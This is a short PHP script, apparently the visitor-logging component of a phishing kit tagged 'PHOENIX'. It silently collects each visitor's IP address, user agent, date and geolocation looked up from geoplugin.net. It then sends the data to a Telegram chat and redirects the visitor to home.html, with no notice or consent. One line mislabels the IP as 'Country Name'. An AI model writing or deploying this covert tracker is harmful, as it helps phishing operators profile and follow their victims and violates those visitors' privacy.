<?php
require("config/config.php");

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
//Name Attributes of HTML FORM


function getVisIpAddr() { 
      
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
        return $_SERVER['HTTP_CLIENT_IP']; 
    } 
    else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
        return $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } 
    else { 
        return $_SERVER['REMOTE_ADDR']; 
    } 
}

$vis_ip = getVisIPAddr(); 

        // Use JSON encoded string and converts 
        // it into a PHP variable 
        $ipdat = @json_decode(file_get_contents( 
            "http://www.geoplugin.net/json.gp?ip=" . $ip)); 
        
        echo 'Country Name: ' . $ipdat->geoplugin_countryName . "\n"; 
        echo 'City Name: ' . $ipdat->geoplugin_city . "\n"; 
        echo 'Continent Name: ' . $ipdat->geoplugin_continentName . "\n"; 
        echo 'Latitude: ' . $ipdat->geoplugin_latitude . "\n"; 
        echo 'Longitude: ' . $ipdat->geoplugin_longitude . "\n"; 
        echo 'Currency Symbol: ' . $ipdat->geoplugin_currencySymbol . "\n"; 
        echo 'Currency Code: ' . $ipdat->geoplugin_currencyCode . "\n"; 
        echo 'Timezone: ' . $ipdat->geoplugin_timezone; 
        


            //Telegram send
            $message = "**NEW-PHOENIX-VISITOR\n";
            $message .= "User-!P : ".$ip."\n";   
            $message .= "----------------------------------------\n";
            $message .= 'Country Name: ' .$vis_ip. "\n"; 
            $message .= "----------------------------------------\n";
            $message .= 'Country Name: ' . $ipdat->geoplugin_countryName . "\n"; 
            $message .= "----------------------------------------\n";
            $message .= 'City Name: ' .$ipdat->geoplugin_city. "\n"; 
            $message .= "----------------------------------------\n";
            $message .= 'Continent Name: ' . $ipdat->geoplugin_continentName . "\n";
            $message .= "----------------------------------------\n";
            $message .= 'Latitude: ' .$ipdat->geoplugin_latitude. "\n"; 
            $message .= "----------------------------------------\n";
            $message .= 'Longitude: ' . $ipdat->geoplugin_longitude . "\n"; 
            $message .= "----------------------------------------\n";
            $message .= 'Currency Symbol: ' . $ipdat->geoplugin_currencySymbol . "\n"; 
            $message .= "----------------------------------------\n";
            $message .= 'Currency Code: ' . $ipdat->geoplugin_currencyCode . "\n"; 
            $message .= "----------------------------------------\n";
            $message .= "User-Agent: ".$browser."\n";
            $message .= "----------------------------------------\n";
            $message .= "Date : $adddate\n";
            send_telegram_msg($message);
    
    
    
            //Output
            header("location:home.html");
?>